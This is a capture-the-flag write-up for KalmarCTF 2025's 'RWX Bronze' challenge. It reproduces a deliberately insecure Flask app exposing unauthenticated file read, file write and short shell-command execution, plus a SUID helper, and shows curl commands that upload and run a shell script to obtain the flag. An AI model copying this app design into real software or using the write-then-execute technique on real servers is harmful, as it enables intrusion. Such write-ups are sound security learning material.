---
title: "RWX Bronze"
description: "We give you file read, file write and code execution. But can you get the flag? Let's start out gently.\n\nNOTE: If you get a 404 error, try using one of the endpoints described in the handout!" 
pubDate: 2025-03-11
ctf: "KalmarCTF 2025"
category: "misc"
author: "sealldev"
section: "CTFs"
image: "images/25-kalmar/icon.png"
---

### Initial Look

We are supplied a `rwx-bronze.zip`, which extracts to a `handout` folder.

Given two main scripts of interest, `app.py` and `would.c`. The flag is stored in `/flag.txt` inside the container as will be outlined later.

`app.py`:
```python
from flask import Flask, request, send_file
import subprocess

app = Flask(__name__)

@app.route('/read')
def read():
    filename = request.args.get('filename', '')
    try:
        return send_file(filename)
    except Exception as e:
        return str(e), 400

@app.route('/write', methods=['POST'])
def write():
    filename = request.args.get('filename', '')
    content = request.get_data()
    try:
        with open(filename, 'wb') as f:
            f.write(content)
        return 'OK'
    except Exception as e:
        return str(e), 400

@app.route('/exec')
def execute():
    cmd = request.args.get('cmd', '')
    if len(cmd) > 7:
        return 'Command too long', 400
    try:
        output = subprocess.check_output(cmd, shell=True)
        return output
    except Exception as e:
        return str(e), 400

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=6664)
```

Quick summary
- Running with `Flask`.
- We have 3 endpoints: 
  - `/read` for file read
  - `/write` for file write
  - and `/exec` which can execute commands (up to 7 characters).

`would.c`:
```c
#include <stdio.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char *argv[]) {
    char full_cmd[256] = {0}; 
    for (int i = 1; i < argc; i++) {
        strncat(full_cmd, argv[i], sizeof(full_cmd) - strlen(full_cmd) - 1);
        if (i < argc - 1) strncat(full_cmd, " ", sizeof(full_cmd) - strlen(full_cmd) - 1);
    }

    if (strstr(full_cmd, "you be so kind to provide me with a flag")) {
        FILE *flag = fopen("/flag.txt", "r");
        if (flag) {
            char buffer[1024];
            while (fgets(buffer, sizeof(buffer), flag)) {
                printf("%s", buffer);
            }
            fclose(flag);
            return 0;
        }
    }

    printf("Invalid usage: %s\n", full_cmd);
    return 1;
}
```

Seems to execute the file read of `/flag.txt` (when specified with the correct `full_cmd`) with the required permissions, the Dockerfile outlines what we lack:
```dockerfile
FROM ubuntu:latest

RUN apt-get update && \
    apt-get install -y python3 python3-pip gcc
RUN pip3 install flask==3.1.0 --break-system-packages

WORKDIR /
COPY flag.txt /
RUN chmod 400 /flag.txt

COPY would.c /
RUN gcc -o would would.c && \
    chmod 6111 would && \
    rm would.c

WORKDIR /app
COPY app.py .

RUN useradd -m user
USER user

CMD ["python3", "app.py"]
```

- `would.c` is compiled with the root used, and has SUID binary permissions.
- `/flag.txt` is inaccessible to `user`

### Working around the character limit

Due to the 7 character limit, my first idea was to use the unlimited write space to add some payloads to `~/`.

I ended up writing a small script:
```bash
#!/bin/bash
whoami
```

And using `/write` with curl to upload it.

```bash
$ curl -X POST "https://<instance>.inst2.chal-kalmarc.tf/write?filename=/home/user/a" -T test.sh
OK
```

We can then execute it with `sh`:
```bash
$ curl "https://<instance>.inst2.chal-kalmarc.tf/exec?cmd=sh%20~/a"
user
```

Cool! So can we execute the `would` binary?

### Solution

I make a new script to execute `would`:
```bash
#!/bin/sh
/would you be so kind to provide me with a flag
```

I upload it to `/home/user/a`

```bash
$ curl -X POST "https://<instance>.inst2.chal-kalmarc.tf/write?filename=/home/user/a" -T test.sh
OK
```

Then I execute it with `sh`:
```bash
$ curl "https://<instance>.inst2.chal-kalmarc.tf/exec?cmd=sh%20~/a"
kalmar{ok_you_demonstrated_your_rwx_abilities_but_let_us_put_you_to_the_test_for_real_now}
```

Flag: `kalmar{ok_you_demonstrated_your_rwx_abilities_but_let_us_put_you_to_the_test_for_real_now}`